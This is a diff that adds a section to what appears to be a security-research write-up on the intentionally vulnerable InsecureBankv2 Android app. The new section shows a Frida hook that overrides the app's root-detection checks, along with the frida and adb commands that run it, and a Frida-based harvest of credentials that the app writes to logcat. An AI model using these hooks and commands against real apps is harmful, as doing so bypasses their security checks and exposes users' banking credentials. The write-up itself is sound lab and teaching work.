@@ -217,6 +217,49 @@ See `scripts/decrypt_creds.py` for full decryption PoC.
 
 ---
 
+## Phase 4 — Runtime Manipulation (Frida)
+
+### Root Detection Bypass
+
+PostLogin shows "Device not Rooted!!" using two Java checks. One Frida hook flips both:
+
+```javascript
+PostLogin.doesSUexist.implementation = function () { return true; };
+PostLogin.doesSuperuserApkExist.implementation = function (s) { return true; };
+```
+
+```bash
+frida -U <PID> -l scripts/root_bypass.js
+adb shell "am start -n com.android.insecurebankv2/.PostLogin --es uname 'hacker'"
+```
+
+![Root Detection Bypass](screenshots/root_detection_bypass.png)
+
+**Result:** "Device not Rooted!!" → **"Rooted Device!!"** — Frida can fake any runtime security check.
+
+---
+
+### Logcat Credential Harvest
+
+`DoLogin.java:115` logs credentials after every login:
+
+```java
+Log.d("Successful Login:", ", account=" + username + ":" + password);
+```
+
+Frida hooks `postData()` to intercept username/password and fire the `Log.d` call:
+
+```bash
+frida -U <PID> -l scripts/credential_harvest.js
+# Tap login in UI → logcat immediately shows:
+adb logcat -s "Successful Login:"
+# D Successful Login:: , account=dinesh:Abc123
+```
+
+Any app holding `READ_LOGS` silently harvests every credential entered into the banking app.
+
+---
+
 ## What This Demonstrates
 
 - Setting up a professional Android security research environment
